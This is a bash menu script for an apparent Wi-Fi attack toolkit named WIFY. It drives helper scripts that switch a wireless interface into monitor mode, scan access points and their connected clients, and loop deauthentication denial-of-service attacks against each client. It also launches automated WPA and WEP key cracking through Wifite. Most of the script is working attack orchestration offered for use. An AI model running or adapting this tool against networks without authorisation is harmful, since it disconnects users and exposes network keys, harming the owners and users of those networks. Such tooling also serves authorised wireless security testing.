#!/bin/bash

if [ "$#" -lt 1 ]
then
	echo "[*] Usages: ./WIFY.sh {Interface_name}"
	./scripts/deviceInfo.sh
	exit 1
fi

if [ "$#" -eq 1 ]; then

echo "!!!!!!!!!!!WELCOME!!!!!!!!!!!"

interface_name=$1
echo -e "\n\033[33m [*] Using Device => $interface_name \033[0m\n"

project_name=''
read -p "Enter the Project's Name: " project_name
mkdir projects/$project_name

OPTIONS='\n
OPTIONS:\n
1 => Put Device in Monitor Mode \n
2 => Put Device in Managed Mode \n
3 => Scan For Access Points (APs) \n
4 => Scan An Access Point (AP) \n
5 => Show Scanned Access Points (APs) \n
6 => DeAuth DOS \n
9 => Auto WPA Attacks Using Wifite \n
10 => Auto WEP Attacks Using Wifite \n
'

echo -e $OPTIONS


keyword="exit"
user_input=""

read -p "Enter an option (type 'exit' to stop): " user_input

while [ "$user_input" != "$keyword" ]
do
    
	#Putting in moniter mode.
    if [ $user_input -eq 1 ]; then 
    	echo "----------------------------------------------------------------------" >> projects/$project_name/command.logs  
    	echo `date +%d-%m-%y-%H_%M` >> projects/$project_name/command.logs
    	./scripts/deviceManagment.sh $interface_name 1 | tee -a projects/$project_name/command.logs

    #putting in managed mode
    elif [ $user_input -eq 2 ]; then
    	echo "----------------------------------------------------------------------" >> projects/$project_name/command.logs 
    	echo `date +%d-%m-%y-%H_%M` >> projects/$project_name/command.logs
    	./scripts/deviceManagment.sh $interface_name 2 | tee -a projects/$project_name/command.logs




    #Scanning for all networks
    elif [ $user_input -eq 3 ]; then
    	mins=5
    	user_input_mins=''
    	read -p "Enter time to sniff (Miniutes)(Default: 5mins):" user_input_mins
    	if [ -n "$user_input_mins" ]; then
    		mins=$user_input_mins
		fi
    	cmd_time=`date +%d-%m-%y-%H_%M`
    	echo "----------------------------------------------------------------------" >> projects/$project_name/command.logs 
    	echo $cmd_time >> projects/$project_name/command.logs 
    	echo /scripts/scanForNetworks.sh $interface_name $mins >> projects/$project_name/command.logs
    	echo $cmd_time >> projects/$project_name/scanForNetworks.txt
    	echo "Command Output" >> projects/$project_name/command.logs
    	./scripts/scanForNetworks.sh $interface_name $mins | tee -a projects/$project_name/command.logs | tee -a projects/$project_name/scanForNetworks.txt




    #Scanning an AP
    elif [ $user_input -eq 4 ]; then
		mins=''
    	bssid=''
    	channel=''
    	mins=5
    	user_input_mins=''
    	read -p "Enter BSSID: " bssid
    	read -p "Enter Channel Number: " channel
    	read -p "Enter time to scan AP (Miniutes)(Default: 5mins): " user_input_mins
    	if [ -n "$user_input_mins" ]; then
    		mins=$user_input_mins
		fi
    	cmd_time=`date +%d-%m-%y-%H_%M`
    	echo "----------------------------------------------------------------------" >> projects/$project_name/command.logs 
    	echo $cmd_time >> projects/$project_name/command.logs
    	echo /scripts/scanNetwork.sh $interface_name $bssid $channel $mins >> projects/$project_name/command.logs
    	echo "Command Output" >> projects/$project_name/command.logs
		./scripts/scanNetwork.sh $interface_name $bssid $channel $mins | tee -a projects/$project_name/command.logs | tee  projects/$project_name/scan-$bssid.txt
		cat projects/$project_name/scan-$bssid.txt | awk '/ESSID of the AP:/ {getline; essid=$0} /BSSID of the AP:/ {getline; bssid=$0} /Channel Number of the AP:/ {getline; channel=$0} END {print "\"" essid "\",\"" bssid "\",\"" channel "\""}' >> projects/$project_name/ScannedAPs.csv


    #Show scanned APs
    elif [ $user_input -eq 5 ]; then
		echo "[*] ScannedAPs:"
    	cat projects/$project_name/ScannedAPs.csv



    #Performing DeAuth Attack
    elif [ $user_input -eq 6 ]; then
    	secs=5
    	bssid=''
    	channel=''
    	packets=5
    	attack_itteration_times=5
    	user_input_packets=''
    	attack_itteration=''
    	delay_itteration=''
		echo "[*] ScannedAPs:"
    	cat projects/$project_name/ScannedAPs.csv
    	read -p "Enter BSSID: " bssid
    	read -p "Enter Channel Number: " channel
    	read -p "Enter Number of DeAuth Packets Sent During the Attack (Number)(Default: 5Packts): " user_input_packets
    	read -p "Enter times to itterate DeAuth Attack (Numbers)(Default: 5times): " attack_itteration
    	read -p "Enter delay time between each itteration (Second)(Default: 5sec): " delay_itteration
    	if [ -n "$user_input_packets" ]; then
    	 	packets=$user_input_packets
		fi
    	if [ -n "$attack_itteration" ]; then
    	 	attack_itteration_times=$attack_itteration
		fi
    	if [ -n "$delay_itteration" ]; then
    	 	secs=$delay_itteration
		fi
    	cmd_time=`date +%d-%m-%y-%H_%M`
    	echo "----------------------------------------------------------------------" >> projects/$project_name/command.logs 	
    	echo $cmd_time >> projects/$project_name/command.logs
    	mac_addresses=$(awk '/^\[\*\] MAC Addresses of Stations Connected to AP:/ {p=1; next} p && NF {print $0}' projects/$project_name/scan-$bssid.txt)
    	counter=1
    	while [ $counter -le $attack_itteration_times ]
		do
			echo -e "\n\033[33mItteration Number: $counter\033[0m" | tee -a projects/$project_name/command.logs 
    		while IFS= read -r client; do
        		echo -e "\033[33mDeauthenticating client: $client\033[0m" | tee -a projects/$project_name/command.logs
        		#./scripts/deAuth.sh $mac_addresses | tee -a projects/$project_name/command.logs
        		./scripts/deAuth.sh $interface_name $bssid $client $packets| tee -a projects/$project_name/command.logs
        		sleep $secs  
    		done <<< $mac_addresses			
    		((counter++))
		done


    	


	#Auto WPA attacks Using Wifite
    elif [ $user_input -eq 9 ]; then
    	echo "[*] ScannedAPs:"
    	cat projects/$project_name/ScannedAPs.csv
    	essid=''
    	read -p "Enter target AP's EISSID: " essid
    	cmd_time=`date +%d-%m-%y-%H_%M`
    	echo $cmd_time >> projects/$project_name/command.logs
    	./scripts/wpaAttacks.sh $interface_name $essid | tee projects/$project_name/command.logs | tee projects/$project_name/Attack-WPA-Wifite-$essid.txt





	#Auto WEP attacks Using Wifite
    elif [ $user_input -eq 10 ]; then
    	echo "[*] ScannedAPs:"
    	cat projects/$project_name/ScannedAPs.csv
    	essid=''
    	read -p "Enter target AP's EISSID: " essid
    	cmd_time=`date +%d-%m-%y-%H_%M`
    	echo $cmd_time >> projects/$project_name/command.logs
    	./scripts/wepAttacks.sh $interface_name $essid | tee projects/$project_name/command.logs | tee projects/$project_name/Attack-WEP-Wifite-$essid.txt




    else
    	echo -e "Invalid Options!!!"    
    fi

    echo -e $OPTIONS
    read -p "Enter an options (type 'exit' to stop): " user_input

done










fi #EOF DO NOT EDIT